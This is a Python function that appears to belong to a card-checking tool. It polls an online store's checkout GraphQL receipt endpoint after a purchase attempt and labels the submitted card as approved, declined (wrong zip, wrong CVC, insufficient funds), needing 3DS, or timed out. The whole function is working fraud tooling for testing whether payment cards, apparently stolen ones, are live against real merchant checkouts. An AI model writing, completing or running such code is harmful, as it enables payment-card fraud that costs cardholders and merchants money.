async def poll_for_receipt(session, site_url, session_token, checkout_token, web_build_id,
                           receipt_id, ua, product_title, price_str, formatted_cc,
                           card_check, mon, year):
    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 🔄 Polling for receipt ID: {receipt_id}")
    poll_url = f"{site_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
    poll_headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': site_url,
        'referer': site_url + '/',
        'user-agent': ua,
        'x-checkout-one-session-token': session_token,
        'x-checkout-web-build-id': web_build_id,
        'x-checkout-web-deploy-stage': 'production',
        'x-checkout-web-source-id': checkout_token,
    }
    poll_payload = {
        "query": POLL_QUERY,
        "variables": {
            "receiptId": receipt_id,
            "sessionToken": session_token
        },
        "operationName": "PollForReceipt"
    }

    for attempt in range(1, 16):
        print(f"Poll attempt {attempt}/15...")
        await asyncio.sleep(4)
        try:
            resp = await session.post(poll_url, headers=poll_headers, json=poll_payload)
            if resp.status_code != 200:
                continue
            data = resp.json()
            receipt = data.get('data', {}).get('receipt', {})
            text = resp.text

            if f"{site_url}/thank_you" in text or "Your order is confirmed" in text:
                result_text = f"✅ APPROVED - {formatted_cc}\n💰 Amount: ${price_str}"
                return result_text, None
            elif 'INCORRECT_ZIP' in text:
                result_text = f"❌ DECLINED - INCORRECT ZIP"
                return result_text, None
            elif 'INSUFFICIENT_FUNDS' in text:
                result_text = f"❌ DECLINED - INSUFFICIENT FUNDS"
                return result_text, None
            elif 'INCORRECT_CVC' in text:
                result_text = f"❌ DECLINED - INCORRECT CVC"
                return result_text, None
            elif 'CompletePaymentChallenge' in text or 'AUTHORIZATION_ERROR' in text or '/authentications/' in text:
                result_text = f"🟡 3DS REQUIRED - {formatted_cc}\n💰 Amount: ${price_str}"
                return result_text, None
            elif receipt.get('__typename') == 'FailedReceipt':
                err = receipt.get('processingError', {}).get('code', 'Unknown')
                result_text = f"❌ DECLINED - {err}"
                return result_text, None
            elif receipt.get('__typename') in ('ProcessingReceipt', 'WaitingReceipt'):
                continue
            else:
                continue
        except Exception as e:
            print(f"Poll exception: {e}")
            continue

    return f"⚠️ TIMEOUT - {formatted_cc}", None

